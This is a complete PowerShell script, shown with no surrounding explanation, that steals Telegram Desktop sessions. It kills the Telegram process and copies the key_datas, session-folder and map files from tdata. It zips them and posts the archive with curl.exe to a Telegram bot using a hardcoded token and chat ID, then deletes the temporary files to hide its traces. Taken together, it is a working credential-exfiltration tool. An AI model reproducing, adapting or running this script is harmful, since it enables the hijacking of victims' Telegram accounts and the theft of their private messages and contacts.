$token = "8649684929:AAGUPmSFkh3tLV6OkveTTX3nuIc4rCNjs_A"
$chatId = "7068280080"
$tdata = "$env:APPDATA\Telegram Desktop\tdata"
$zip = "$env:TEMP\s.zip"
$tmp = "$env:TEMP\t_dir"

taskkill /F /IM Telegram.exe /T 2>$null
if (Test-Path $tdata) {
    if (Test-Path $zip) { Remove-Item $zip -Force }
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force }
    $null = New-Item -ItemType Directory -Path $tmp -Force
    Copy-Item "$tdata\key_datas" -Destination $tmp
    Copy-Item "$tdata\D877F783D5D3EF8C*" -Destination $tmp
    Copy-Item "$tdata\map*" -Destination $tmp
    Add-Type -A System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tmp, $zip)
    curl.exe -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zip"
    Remove-Item $zip, $tmp -Recurse -Force
}
